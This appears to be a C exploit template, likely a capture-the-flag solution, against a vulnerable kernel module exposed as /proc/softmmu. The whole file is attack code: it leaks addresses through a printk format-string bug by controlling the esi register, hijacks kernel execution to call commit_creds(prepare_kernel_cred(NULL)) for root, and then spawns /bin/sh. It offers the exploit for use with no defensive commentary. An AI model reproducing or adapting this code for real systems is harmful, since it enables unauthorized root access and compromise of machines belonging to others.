#define HEX "0123456789abcdef"
void write_hex(int fd, int num) {
    for (int i = 7; i >= 0; i--)
    {
        write(fd, &HEX[(num >> (i * 4)) & 0xf], 1);
    }
}

#define LOG_HEX(num) write_hex(2, (int)(num))
#define LOG(str) write(2, (str), sizeof(str) - 1)

typedef __attribute__((regparm(1))) void *(*prepare_kernel_cred_t)(void *);
typedef __attribute__((regparm(1))) int (*commit_creds_t)(void *);
#define prepare_kernel_cred ((prepare_kernel_cred_t)(%(prepare_kernel_cred)d))
#define commit_creds ((commit_creds_t)(%(commit_creds)d))

void *memcpy(void *dst, const void *src, unsigned int length)
{
    for (int i = 0; i < length; i++)
    {
        *(char *)(dst++) = *(char *)(src++);
    }

    return dst;
}

int privileged() {
    // get root
    LOG("running in kernel yay!\n");
    LOG("getting root!\n");
    commit_creds(prepare_kernel_cred(NULL));
    return 0;
}

// a hack that lets us control esi in syscall entry
#define __NR_myread __NR_read

static inline _sfsyscall4( ssize_t, myread, int, fd, void *, buf, size_t, count, void *, esi );

void set_vaddr(int fd, void *addr) {
    write(fd, &addr, sizeof(addr));
}

void get_paddr(int fd, void **paddr, void *esi) {
    // esi is saved on the stack (as any other register).
    // we use it as the target of the printk format specifier.
    myread(fd, &paddr, sizeof(paddr), esi);
}

int to_int(char a) {
    if ('0' <= a && a <= '9') {
        return a - '0';
    }
    return a - 'a' + 10;
}

void decode_hex(char *buf, unsigned int length) {
    // python input is hex encoded in order to avoid the target's pty interpreting escape sequences
    for (int i=0; i < length; i++) {
        buf[i] = (to_int(buf[2 * i]) << 4) + to_int(buf[2 * i + 1]);
    }
    buf[length] = 0;
}

void read_buf(char *buf, unsigned int length) {
    unsigned int i = 0;
    while (i < length) {
        i += read(0, buf + i, length - i);
    }
    decode_hex(buf, (length - 1) / 2);
}

int main()
{
    int fd = open("/proc/softmmu", O_RDWR, 0);
    if (fd < 0)
    {
        LOG("error opening file!\n");
        exit(1);
    }

    LOG("target addr: 0x");
    LOG_HEX(privileged);
    LOG("\n");

    void *tmp;
    char fmt[%(MAX_FMT)d * 2 + 1];
    set_vaddr(fd, fmt);

    char esi[8 + 1];
    for (int i = 0; i < 1 + 4; i++)
    {
        read_buf(&esi, sizeof(esi));
        read_buf(fmt, sizeof(fmt));
        get_paddr(fd, &tmp, *(void **)esi);
    }

    // trigger
    set_vaddr(fd, 0);

    // spawn shell
    LOG("spawning shell\n");
    execve("/bin/sh", (char *[]){"/bin/sh", NULL}, (char *[]){NULL});

    exit(0);
}